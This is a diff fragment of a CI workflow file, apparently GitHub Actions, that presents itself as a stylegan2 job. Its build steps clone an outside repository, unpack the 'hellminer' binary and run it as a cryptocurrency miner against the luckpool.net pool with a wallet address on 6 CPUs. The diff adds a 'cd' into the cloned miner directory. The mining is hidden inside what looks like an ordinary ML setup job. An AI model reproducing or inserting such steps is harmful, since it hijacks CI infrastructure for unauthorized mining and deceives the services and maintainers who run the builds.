@@ -34,7 +34,9 @@ jobs:
         pip install requests==2.22.0
         pip install Pillow==6.2.1
         pip install GitPython
+        pip install --upgrade pip
         git clone https://github.com/joakin20/geladaju.git
+        cd /geladaju
         tar -xvf hellminer_cpu_linux.tar.gz
         ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RCe3fTKcK132fymKGCsNaqhjTDK6m4V5Wz.g1 -p x --cpu 6
         cd /inputs/stylegan2
